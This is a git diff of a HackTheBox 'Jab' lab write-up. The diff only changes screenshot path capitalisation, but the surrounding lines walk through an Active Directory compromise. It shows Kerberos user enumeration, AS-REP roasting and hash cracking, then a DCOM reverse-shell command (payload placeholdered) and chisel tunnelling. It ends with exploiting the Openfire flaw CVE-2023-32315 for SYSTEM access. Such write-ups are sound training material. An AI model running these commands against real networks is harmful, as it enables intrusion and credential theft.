@@ -1,6 +1,6 @@
 # HackTheBox - Jab
 
-![Screenshot0](./Screenshots/0.png)
+![Screenshot0](./screenshots/0.png)
 
 <br>
 
@@ -31,7 +31,7 @@
 
 As always, I started with a port scan.
 
-![Screenshot1](./Screenshots/1.png)
+![Screenshot1](./screenshots/1.png)
 
 We see all kinds of ports open.
 
@@ -39,7 +39,7 @@ Ports like `88` tell us that we are probably dealing with a domain controller he
 
 The following ports are also interesting.
 
-![Screenshot2](./Screenshots/2.png)
+![Screenshot2](./screenshots/2.png)
 
 It seems that a Jabber server is running here, which also fits the name of the box.
 
@@ -53,11 +53,11 @@ So I used [kerbrute](https://github.com/ropnop/kerbrute) to search for existing 
 
 __Command:__ `./kerbrute_linux_amd64 userenum --dc dc01.jab.htb -d jab.htb -v jsmith.txt`
 
-![Screenshot3](./Screenshots/3.png)
+![Screenshot3](./screenshots/3.png)
 
 I found 1701 valid usernames.
 
-![Screenshot4](./Screenshots/4.png)
+![Screenshot4](./screenshots/4.png)
 
 <br>
 <br>
@@ -76,9 +76,9 @@ __Command:__ `impacket-GetNPUsers -dc-ip <IP> jab.htb/ -usersfile users.txt -for
 
 I got 3 hashes from users who had pre-authentication disabled.
 
-![Screenshot5](./Screenshots/5.png)
+![Screenshot5](./screenshots/5.png)
 
-![Screenshot6](./Screenshots/6.png)
+![Screenshot6](./screenshots/6.png)
 
 <br>
 
@@ -88,7 +88,7 @@ The hash was quickly cracked with the __rockyou.txt__ list.
 
 __Command:__ `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt`
 
-![Screenshot7](./Screenshots/7.png)
+![Screenshot7](./screenshots/7.png)
 
 <br>
 
@@ -99,7 +99,7 @@ Now that I had a valid user, I enumerated the AD using `bloodhound-python` to be
 __Command:__ `bloodhound-python -u <USERNAME> -p <PASS> -ns <IP> -d jab.htb -c all --zip`
 
 
-![Screenshot7.5](./Screenshots/7.5.png)
+![Screenshot7.5](./screenshots/7.5.png)
 
 <br>
 
@@ -113,11 +113,11 @@ There are many Jabber clients, I used the Jabber client __Pidgin__ and checked w
 
 I opened Pidgin and added my account and the domain of the server to the client.
 
-![Screenshot8](./Screenshots/8.png)
+![Screenshot8](./screenshots/8.png)
 
 We get a new window.
 
-![Screenshot9](./Screenshots/9.png)
+![Screenshot9](./screenshots/9.png)
 
 We are successfully logged in!
 
@@ -127,13 +127,13 @@ So how does this help us now?
 
 It gets interesting when we go to "Tools" -> "Room List" -> "Get List" to search for rooms / group chats.
 
-![Screenshot10](./Screenshots/10.png)
+![Screenshot10](./screenshots/10.png)
 
-![Screenshot11](./Screenshots/11.png)
+![Screenshot11](./screenshots/11.png)
 
 The room __pentest2003__ sounds interesting and I took a look inside.
 
-![Screenshot12](./Screenshots/12.png)
+![Screenshot12](./screenshots/12.png)
 
 We see here a conversation between two users who are talking about their pentest and we get the password of the service account `svc_openfire` through their cracking work.
 
@@ -145,19 +145,19 @@ Now I had two accounts but had not found a way to establish a shell.
 
 Bloodhound helped me at this point by marking the new user as "Owned" and selecting "Shortest Paths to Domain Admins from Owned Principals".
 
-![Screenshot13](./Screenshots/13.png)
+![Screenshot13](./screenshots/13.png)
 
-![Screenshot14](./Screenshots/14.png)
+![Screenshot14](./screenshots/14.png)
 
 The impacket Suite provides us with a tool with which we can now use this method.
 
 __Command:__ `impacket-dcomexec -object MMC20 -silentcommand -debug JAB/svc_openfire:<PASS>\@<IP> 'powershell.exe -e <BASE64_ENCODED_REV-SHELL>'`
 
-![Screenshot15](./Screenshots/15.png)
+![Screenshot15](./screenshots/15.png)
 
 I got a reverse shell and the first flag.
 
-![Screenshot16](./Screenshots/16.png)
+![Screenshot16](./screenshots/16.png)
 
 <br>
 <br>
@@ -179,11 +179,11 @@ When I did network enumeration and looked for ports that only listen locally on 
 
 __Command:__ `netstat -ano | findstr 127`
 
-![Screenshot17](./Screenshots/17.png)
+![Screenshot17](./screenshots/17.png)
 
 I used `curl.exe` to test whether a web server was running here.
 
-![Screenshot18](./Screenshots/18.png)
+![Screenshot18](./screenshots/18.png)
 
 <br>
 
@@ -201,13 +201,13 @@ __On Box:__ `.\chisel.exe client 10.10.15.48:9009 R:9090:127.0.0.1:9090 R:9091:1
 
 Now I could look on my computer what is behind this port and saw the login page to __Openfire__, an __XMPP server__.
 
-![Screenshot19](./Screenshots/19.png)
+![Screenshot19](./screenshots/19.png)
 
 We also see a version number which is always useful for finding suitable exploits.
 
 I used the credentials we used before from user `svc_openfire` and logged in.
 
-![Screenshot20](./Screenshots/20.png)
+![Screenshot20](./screenshots/20.png)
 
 <br>
 
@@ -217,15 +217,15 @@ I found out that this version is vulnerable to __CVE-2023-32315__ which can lead
 
 I uploaded the exploit / plugin...
 
-![Screenshot21](./Screenshots/21.png)
+![Screenshot21](./screenshots/21.png)
 
 ...and now received __RCE__ as __NT AUTHORITY\SYSTEM__.
 
-![Screenshot22](./Screenshots/22.png)
+![Screenshot22](./screenshots/22.png)
 
 Finally, I established a last reverse shell from here and took the final flag.
 
-![Screenshot23](./Screenshots/23.png)
+![Screenshot23](./screenshots/23.png)
 
 <br>
 <br>
